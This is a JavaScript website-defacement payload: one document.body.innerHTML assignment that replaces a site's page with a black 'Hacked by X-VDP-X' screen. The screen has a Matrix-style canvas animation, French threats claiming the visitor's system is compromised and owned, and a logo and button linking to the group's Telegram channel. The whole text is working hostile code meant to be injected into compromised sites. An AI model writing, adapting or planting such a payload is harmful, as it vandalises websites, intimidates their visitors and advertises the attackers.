document.body.innerHTML = `
<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Hacked by X-VDP-X</title>

<style>
  *{margin:0;padding:0;box-sizing:border-box}
  html,body{
    width:100%;height:100%;
    background:black;overflow:hidden;
    font-family:Arial,sans-serif;
    color:red;text-align:center;
    user-select:none;cursor:crosshair;
  }
  #matrix{
    position:fixed;top:0;left:0;
    width:100%;height:100%;
    z-index:1;pointer-events:none;
  }
  .content{
    position:relative;z-index:2;
    display:flex;flex-direction:column;
    align-items:center;justify-content:center;
    height:100%;padding:20px;
  }
  .logo-container{
    margin-bottom:20px;perspective:800px;
    transition:transform .2s ease-out;
  }
  .logo-container img{
    width:150px;height:150px;border-radius:50%;
    box-shadow:0 0 20px red,0 0 40px red,0 0 60px darkred;
    transition:.3s;display:block;margin:auto;
  }
  .logo-container img:hover{
    transform:scale(1.1);
    box-shadow:0 0 30px red,0 0 50px darkred;
  }
  h1,h2,h3{margin:15px 0;text-shadow:0 0 10px red,0 0 20px red}
  h2{font-size:20px}
  h3{font-size:16px;max-width:90%;margin:auto}
  .warning{
    margin-top:20px;font-weight:bold;font-size:16px;
    color:red;text-shadow:0 0 10px red,0 0 20px darkred;
    animation:glitch 2.5s infinite;position:relative;
  }
  .btn{
    margin-top:25px;padding:12px 40px;
    background:#00bfff;color:white;font-weight:700;
    border:none;border-radius:30px;text-transform:uppercase;
    cursor:pointer;box-shadow:0 0 10px #00bfff;
    font-size:16px;letter-spacing:2px;
    animation:pulseNeon 3s ease-in-out infinite;
  }
</style>

</head>
<body>

<canvas id="matrix"></canvas>

<div class="content">
  <div class="logo-container" onclick="window.location.href='https://t.me/xvdpx6'">
    <img src="https://i.postimg.cc/q79gXyTp/image-2.webp">
  </div>

  <h1 id="typewriter"></h1>
  <h2># Hack Word # Hacked # X-VDP-X # Merry Christmas</h2>
  <h3>VOTRE SYSTÈME A ÉTÉ COMPROMIS. NOUS AVONS TOUT...</h3>

  <p class="warning">VOTRE PEUR NOUS ALIMENTE, VOTRE SYSTÈME NOUS APPARTIENT !</p>

  <button class="btn" onclick="window.location.href='https://t.me/xvdpx6'">TELEGRAM</button>
</div>

<script>
const canvas=document.getElementById('matrix');
const ctx=canvas.getContext('2d');

let w=innerWidth,h=innerHeight;
canvas.width=w;canvas.height=h;

const fontSize=18;
let cols=Math.floor(w/fontSize);
let drops=new Array(cols).fill(1);

const chars="アァイィウヴエェオカガキギクグケゲコゴサザシジスズセゼソゾタダチッヂヅテデトドナニヌネノハバパヒビピフブプヘベペホボポマミムメモヤユヨラリルレロワヲン".split("");

function resize(){
  w=innerWidth;h=innerHeight;
  canvas.width=w;canvas.height=h;
  cols=Math.floor(w/fontSize);
  drops=new Array(cols).fill(1);
}
addEventListener('resize',resize);

let last=0,fps=60,interval=1000/fps;

function draw(t=0){
  if(t-last>interval){
    ctx.fillStyle="rgba(0,0,0,0.07)";
    ctx.fillRect(0,0,w,h);

    for(let i=0;i<drops.length;i++){
      let blue=191+Math.floor(64*Math.sin(t/500+i));
      ctx.fillStyle = 'rgb(0,' + blue + ',255)';
      ctx.font=fontSize+"px monospace";

      const txt=chars[Math.floor(Math.random()*chars.length)];
      ctx.fillText(txt,i*fontSize,drops[i]*fontSize);

      if(drops[i]*fontSize>h || Math.random()>0.98) drops[i]=0;
      drops[i]++;
    }
    last=t;
  }
  requestAnimationFrame(draw);
}
draw();

const text="Hacked by X-VDP-X";
let idx=0;
const target=document.getElementById("typewriter");

function type(){
  if(idx<text.length){
    target.textContent+=text[idx];
    idx++;setTimeout(type,120);
  }
}
type();
</script>

</body>
</html>
`
